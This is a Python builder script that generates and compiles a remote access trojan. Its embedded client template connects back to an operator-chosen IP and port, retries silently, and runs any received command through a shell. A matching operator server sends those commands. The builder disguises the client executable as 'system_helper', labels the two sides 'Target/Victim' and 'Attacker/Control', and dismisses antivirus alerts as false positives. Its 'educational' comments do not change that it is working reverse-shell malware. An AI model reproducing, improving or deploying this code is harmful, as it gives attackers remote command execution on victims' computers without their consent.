import os
import sys
import subprocess
import shutil
import platform
import re

# --- TEMPLATES ---

CLIENT_SOURCE = """import socket
import subprocess
import os
import sys
import time

SERVER_IP = '{SERVER_IP}'
SERVER_PORT = {SERVER_PORT}

def connect():
    while True:
        try:
            # Silent retry to avoid spamming logs if network is down
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(60)

def execute_command(command):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = process.communicate(timeout=30)
        output = stdout + stderr
        if not output:
            return f"[SUCCESS] Command executed successfully.".encode('utf-8')
        return output
    except subprocess.TimeoutExpired:
        process.kill()
        return f"[ERROR] Command timed out.".encode('utf-8')
    except Exception as e:
        return f"[ERROR] {str(e)}".encode('utf-8')

def main():
    # Optional: Hide console window on Windows if compiled as a GUI app (requires specific pyinstaller flags)
    # For this educational version, we keep the console for debugging.
    
    while True:
        try:
            socket_conn = connect()
            while True:
                command = socket_conn.recv(1024).decode()
                if command.lower() == 'exit':
                    socket_conn.close()
                    return
                output = execute_command(command)
                socket_conn.send(output)
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
"""

SERVER_SOURCE = """import socket
import sys
import os

LISTEN_IP = '0.0.0.0'
PORT = {SERVER_PORT}

def main():
    print(f"--- RAT Server Started (Port {PORT}) ---")
    print("Waiting for connection...")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LISTEN_IP}:{PORT}")
    except Exception as e:
        print(f"[!] Failed to bind: {e}")
        sys.exit(1)

    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    while True:
        try:
            cmd = input("# Command: ")
            if cmd.lower() == 'exit':
                client.send('exit'.encode())
                break
            client.send(cmd.encode())
            data = client.recv(4096)
            if not data:
                print("[!] Connection lost.")
                break
            print(data.decode())
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    client.close()
    server.close()

if __name__ == "__main__":
    main()
"""

# --- HELPERS ---

def install_pyinstaller():
    print("[*] Checking for PyInstaller...")
    try:
        import PyInstaller
        print("[+] PyInstaller is already installed.")
        return True
    except ImportError:
        print("[*] PyInstaller not found. Installing now...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            print("[+] PyInstaller installed successfully.")
            return True
        except subprocess.CalledProcessError:
            print("[-] Failed to install PyInstaller. Please run: pip install pyinstaller")
            return False

def is_valid_ip(ip):
    pattern = re.compile(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    return pattern.match(ip) is not None

def build_executable(name, source_code, icon=None):
    print(f"[*] Writing source code for {name}...")
    source_file = f"{name}_source.py"
    with open(source_file, "w") as f:
        f.write(source_code)
    
    print(f"[*] Compiling {name} to executable using PyInstaller...")
    print("    (This may take a few minutes)")
    
    # PyInstaller arguments
    # --onefile: Create a single executable
    # --noconsole: (Optional) Hide console window. We will NOT use this for the server so we can see logs.
    #              For the client, hiding it might be desired for "stealth", but for educational purposes, we leave it visible.
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--distpath", "./dist",
        "--workpath", f"./build_{name}",
        "--specpath", ".",
        "--name", name,
        "--clean",  # Clean previous builds
        source_file
    ]
    
    # If building the client and user wants it hidden (optional feature, not implemented in prompt but good practice)
    # We will keep console visible for both for educational transparency.
    
    try:
        subprocess.run(cmd, check=True)
        print(f"[+] Successfully built {name}!")
        output_path = os.path.abspath(os.path.join("dist", name))
        if platform.system() == "Windows":
            output_path += ".exe"
        print(f"[!] Executable location: {output_path}")
        print("[!] WARNING: Antivirus software will likely flag this executable as a threat (False Positive).")
        print("    This is normal for custom-built RATs. Do not distribute blindly.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Build failed: {e}")
    finally:
        # Cleanup source and build files
        if os.path.exists(source_file):
            os.remove(source_file)
        if os.path.exists(f"./build_{name}"):
            shutil.rmtree(f"./build_{name}", ignore_errors=True)

def main():
    print("--- RAT Executable Builder ---")
    print("This tool builds standalone executables for Windows, Mac, or Linux.")
    print("Note: You can only build for the OS you are currently running on.")
    
    if not install_pyinstaller():
        sys.exit(1)

    print("\nWhat do you want to build?")
    print("1. Client (Target/Victim)")
    print("2. Server (Attacker/Control)")
    choice = input("Enter choice (1/2): ").strip()

    if choice == '1':
        # Build Client
        print("\n--- Client Configuration ---")
        while True:
            ip = input("Enter Server IP Address: ").strip()
            if is_valid_ip(ip):
                break
            print("Invalid IP. Try again.")
        
        port_input = input("Enter Server Port (default 9999): ").strip()
        port = 9999 if not port_input else int(port_input)
        
        source = CLIENT_SOURCE.replace("{SERVER_IP}", ip).replace("{SERVER_PORT}", str(port))
        build_executable("system_helper", source)

    elif choice == '2':
        # Build Server
        print("\n--- Server Configuration ---")
        port_input = input("Enter Listening Port (default 9999): ").strip()
        port = 9999 if not port_input else int(port_input)
        
        if not (1024 <= port <= 65535):
            print("Invalid port. Must be 1024-65535.")
            sys.exit(1)
            
        source = SERVER_SOURCE.replace("{SERVER_PORT}", str(port))
        build_executable("control_panel", source)
        
        print("\n[!] Windows Firewall Warning:")
        print("    When you run the server executable, Windows Firewall will likely block it.")
        print("    You must allow the application through the firewall for it to accept connections.")

    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
